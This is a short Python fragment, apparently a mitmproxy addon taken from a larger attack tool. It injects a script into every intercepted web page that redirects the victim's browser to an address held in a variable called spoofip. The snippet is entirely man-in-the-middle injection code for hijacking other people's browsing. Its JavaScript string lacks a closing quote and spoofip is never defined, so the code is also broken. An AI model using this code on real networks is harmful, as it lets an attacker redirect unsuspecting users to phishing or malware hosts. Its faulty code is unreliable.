
            import mitmproxy
            def response(flow):
                flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://"+spoofip+"</script>")
            